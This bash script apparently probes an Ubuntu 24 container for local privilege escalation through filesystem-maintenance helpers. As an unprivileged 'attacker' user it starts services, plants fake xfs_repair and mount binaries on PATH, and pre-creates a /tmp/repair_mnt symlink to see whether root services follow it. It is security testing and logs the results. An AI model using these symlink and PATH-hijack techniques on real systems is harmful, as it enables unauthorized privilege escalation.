#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/fsck-mount-tmp.out"

mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -u

probe=/tmp/fsck-mount-tmp-probe
vartmp=/var/tmp/fsck-mount-tmp-probe
lockprobe=/run/lock/fsck-mount-tmp-probe
repair_target=/tmp/repair_mnt_target
fakebin="$probe/fakebin"

cleanup() {
  set +e
  if [ -L /tmp/repair_mnt ]; then
    target="$(readlink /tmp/repair_mnt 2>/dev/null || true)"
    if [ "$target" = "$repair_target" ]; then
      rm -f /tmp/repair_mnt
    fi
  elif [ -d /tmp/repair_mnt ]; then
    rmdir /tmp/repair_mnt 2>/dev/null || true
  fi
  rm -rf "$probe" "$vartmp" "$repair_target"
  rm -f "$lockprobe" "$lockprobe".*
}
trap cleanup EXIT
cleanup
mkdir -p "$probe" "$vartmp" "$fakebin"
chmod 1777 "$probe" "$vartmp"

section() {
  printf '\n## %s\n' "$1"
}

run_attacker() {
  printf '\n$ attacker: %s\n' "$*"
  runuser -u attacker -- bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

section "target and package state"
cat /etc/os-release | sed -n '1,8p'
uname -a
id attacker
printf '\n# package versions\n'
dpkg-query -W -f='${binary:Package}\t${Version}\n' \
  xfsprogs e2fsprogs systemd util-linux mount mdadm lvm2 udev 2>&1 | sort

section "helper binary ownership"
for p in \
  /usr/sbin/fsck.xfs /usr/sbin/xfs_repair /usr/sbin/xfs_scrub /usr/sbin/xfs_scrub_all \
  /sbin/e2scrub /sbin/e2scrub_all /usr/lib/systemd/systemd-fsck /usr/lib/systemd/systemd-fsckd \
  /sbin/fstrim /sbin/blkdeactivate /usr/bin/mount /usr/bin/umount /usr/lib/udisks2/udisksd
do
  if [ -e "$p" ]; then
    stat -Lc '%A %a %U:%G %n' "$p"
  else
    echo "MISSING $p"
  fi
done

section "default service and timer state"
systemctl list-unit-files --type=service --type=timer --type=mount --type=automount --no-pager |
  grep -Ei 'fsck|scrub|trim|blk|mount|umount|xfs|e2' || true
printf '\n# live relevant units\n'
systemctl --no-pager --type=service --type=timer --type=mount --type=automount |
  grep -Ei 'fsck|scrub|trim|blk|mount|umount|xfs|e2' || true
printf '\n# selected unit properties\n'
for u in \
  systemd-fsck-root.service systemd-fsckd.service e2scrub_all.timer e2scrub_all.service \
  e2scrub_reap.service fstrim.timer fstrim.service xfs_scrub_all.timer \
  xfs_scrub_all.service blk-availability.service umount.target
do
  echo "### $u"
  systemctl show -p FragmentPath -p UnitFileState -p ActiveState -p ConditionResult -p User -p Group -p ExecStart "$u" 2>&1 || true
done

section "unit file entrypoints"
for f in \
  /usr/lib/systemd/system/systemd-fsck-root.service \
  /usr/lib/systemd/system/systemd-fsck@.service \
  /usr/lib/systemd/system/e2scrub_all.service \
  /usr/lib/systemd/system/e2scrub_all.timer \
  /usr/lib/systemd/system/e2scrub@.service \
  /usr/lib/systemd/system/fstrim.service \
  /usr/lib/systemd/system/fstrim.timer \
  /usr/lib/systemd/system/xfs_scrub_all.service \
  /usr/lib/systemd/system/xfs_scrub_all.timer \
  /usr/lib/systemd/system/xfs_scrub@.service \
  /usr/lib/systemd/system/blk-availability.service
do
  echo "### $f"
  if [ -e "$f" ]; then
    nl -ba "$f" | sed -n '1,120p'
  else
    echo "MISSING"
  fi
done

section "root filesystem and fsck generator state"
echo "# /etc/fstab"
nl -ba /etc/fstab
echo "# /etc/e2scrub.conf"
nl -ba /etc/e2scrub.conf 2>&1 || true
echo "# /proc/cmdline"
cat /proc/cmdline
echo "# root mount"
findmnt -no TARGET,SOURCE,FSTYPE,OPTIONS /
echo "# local-fs dependencies"
systemctl list-dependencies --no-pager --plain --all local-fs.target |
  grep -Ei 'fsck|mount|tmp|var|run' || true
echo "# generated fsck/mount units"
find /run/systemd/generator /run/systemd/generator.early /run/systemd/generator.late \
  -maxdepth 2 -type f 2>/dev/null | sort | grep -Ei 'fsck|mount|tmp|var|run' |
  while read -r f; do
    echo "### $f"
    sed -n '1,120p' "$f"
  done || true

section "public temp and lock directory state"
for p in /tmp /var/tmp /run/lock /run/lock/lvm /run/lock/subsys /run/mount \
  /run/systemd/fsck.progress /var/lib/e2scrub /var/lib/mdcheck /etc/fstab /etc/e2scrub.conf
do
  if [ -e "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$p"
  else
    echo "MISSING $p"
  fi
done
for d in /tmp /var/tmp /run/lock; do
  run_attacker "touch $d/fsck-mount-tmp.uid1001 && ls -l $d/fsck-mount-tmp.uid1001 && rm -f $d/fsck-mount-tmp.uid1001"
done

section "fsck.xfs repair_mnt code path"
nl -ba /usr/sbin/fsck.xfs | sed -n '1,120p'

section "other helper code refs around temp, locks, mounts"
grep -RHE '(/tmp|/var/tmp|/run/lock|repair_mnt|mktemp|mount|umount|fsck|lock)' \
  /usr/sbin/fsck.xfs /usr/sbin/xfs_scrub_all /sbin/e2scrub /sbin/e2scrub_all \
  /sbin/blkdeactivate /usr/share/mdadm/mdcheck 2>/dev/null | sed -n '1,260p'

section "attacker trigger attempts"
mkdir -p "$probe/mnt"
run_attacker "touch /forcefsck"
run_attacker "systemctl start systemd-fsck-root.service"
run_attacker "systemctl start fstrim.service"
run_attacker "systemctl start blk-availability.service"
run_attacker "systemctl start e2scrub_all.service"
run_attacker "systemctl start xfs_scrub_all.service"
run_attacker "/usr/lib/systemd/systemd-fsck /tmp/nonexistent-device"
run_attacker "/sbin/e2scrub_all"
run_attacker "/sbin/e2scrub /tmp"
run_attacker "/usr/sbin/xfs_scrub_all"
run_attacker "/usr/sbin/xfs_scrub /tmp"
run_attacker "/sbin/fstrim --listed-in /etc/fstab:/proc/self/mountinfo --verbose --quiet-unsupported"
run_attacker "mkdir -p $probe/mnt; mount -t tmpfs tmpfs $probe/mnt"
run_attacker "mkdir -p $probe/mnt; mount --bind /tmp $probe/mnt"
run_attacker "mkdir -p $probe/mnt; truncate -s 16M $probe/loop.img; mount -o loop $probe/loop.img $probe/mnt"
run_attacker "umount $probe/mnt"
run_attacker "systemctl reboot"

section "attacker-controlled fsck.xfs branch stays uid1001"
cat >"$fakebin/xfs_repair" <<'SH'
#!/bin/sh
count_file=/tmp/fsck-mount-tmp-probe/xfs_repair.count
count=0
[ -f "$count_file" ] && count="$(cat "$count_file")"
count=$((count + 1))
echo "$count" >"$count_file"
{
  echo "fake_xfs_repair_call=$count"
  id
  printf 'argv='
  printf '<%s>' "$@"
  printf '\n'
} >>/tmp/fsck-mount-tmp-probe/fake-helper.log
[ "$count" -eq 1 ] && exit 2
exit 0
SH
cat >"$fakebin/mount" <<'SH'
#!/bin/sh
{
  echo "fake_mount"
  id
  printf 'argv='
  printf '<%s>' "$@"
  printf '\n'
  if [ -e /tmp/repair_mnt ]; then
    ls -ld /tmp/repair_mnt
  fi
} >>/tmp/fsck-mount-tmp-probe/fake-helper.log
exit 0
SH
cat >"$fakebin/umount" <<'SH'
#!/bin/sh
{
  echo "fake_umount"
  id
  printf 'argv='
  printf '<%s>' "$@"
  printf '\n'
} >>/tmp/fsck-mount-tmp-probe/fake-helper.log
exit 0
SH
cat >"$fakebin/blkid" <<'SH'
#!/bin/sh
exit 2
SH
chmod 0755 "$fakebin"/*
touch "$probe/devfile"
chown -R attacker:attacker "$probe"
runuser -u attacker -- bash -lc "rm -rf '$repair_target' /tmp/repair_mnt; mkdir -p '$repair_target'; ln -s '$repair_target' /tmp/repair_mnt; PATH='$fakebin':\$PATH /usr/sbin/fsck.xfs -fy '$probe/devfile'; echo fsck_xfs_rc:\$?; cat '$probe/fake-helper.log' 2>&1 || true; ls -ld /tmp/repair_mnt '$repair_target' 2>&1 || true" 2>&1 || true

section "root service runs with attacker precreated repair_mnt symlink"
rm -f /tmp/repair_mnt
rm -rf "$repair_target"
runuser -u attacker -- bash -lc "mkdir -p '$repair_target'; ln -s '$repair_target' /tmp/repair_mnt; ls -ld /tmp/repair_mnt '$repair_target'"
for u in systemd-fsck-root.service e2scrub_all.service fstrim.service xfs_scrub_all.service blk-availability.service; do
  echo "### root systemctl start $u"
  systemctl start "$u" 2>&1 || true
done
echo "# post-service repair_mnt state"
ls -ld /tmp/repair_mnt "$repair_target" 2>&1 || true
echo "# recent journals"
journalctl -n 80 --no-pager -u systemd-fsck-root.service -u e2scrub_all.service \
  -u fstrim.service -u xfs_scrub_all.service -u blk-availability.service 2>&1 || true

section "root block-device selector state"
echo "# lsblk"
lsblk --pairs --output NAME,KNAME,TYPE,FSTYPE,LABEL,UUID,MOUNTPOINT,PATH 2>&1 | sed -n '1,240p'
echo "# xfs mounts"
findmnt -rn -t xfs -o SOURCE,TARGET,FSTYPE,OPTIONS 2>&1 | sed -n '1,120p'
echo "# ext lvm scan"
lvs -o lv_path --noheadings -S 'lv_active=active,lv_role=public,lv_role!=snapshot,vg_free>=256' 2>&1 || true

section "cleanup verification"
cleanup
for p in "$probe" "$vartmp" "$repair_target" /tmp/repair_mnt "$lockprobe"; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    ls -ld "$p"
  else
    echo "absent $p"
  fi
done
EOS

sed -n '1,260p' "$log"
